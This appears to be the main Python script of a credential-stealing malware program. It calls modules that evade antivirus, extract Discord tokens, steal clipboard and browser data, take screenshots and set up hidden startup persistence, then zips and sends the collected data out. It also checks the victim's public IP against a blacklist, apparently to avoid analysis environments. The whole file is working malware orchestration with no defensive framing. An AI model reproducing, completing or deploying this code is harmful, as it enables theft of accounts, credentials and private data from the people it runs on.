import threading
import time
import os
import sys
import uuid
import requests
import subprocess
from components.wtoken import DiscordToken
from browsers.browserinfo import getinfo
from components.zipandsend import zipnsend
from components.info import send_screenshot
from components.clipboard import steal_data
from components.startup import hiddenstartup
from components.confirmsend import confirmsend
from components.antiantivirus import antiantivirus
from blacklist.ips import blacklisted_ips
def check_blacklist():
    user_ip = requests.get('https://api.ipify.org').text
    if user_ip in blacklisted_ips:
        return False
    return True
def browser():
    threading.Thread(target=getinfo).start()
    threading.Thread(target=hiddenstartup).start()
if check_blacklist():
    antiantivirus()
    token_extractor = DiscordToken()
    token_extractor.save_tokens()
    steal_data()
    browser()
    send_screenshot()
    confirmsend()
    time.sleep(1)
    zipnsend()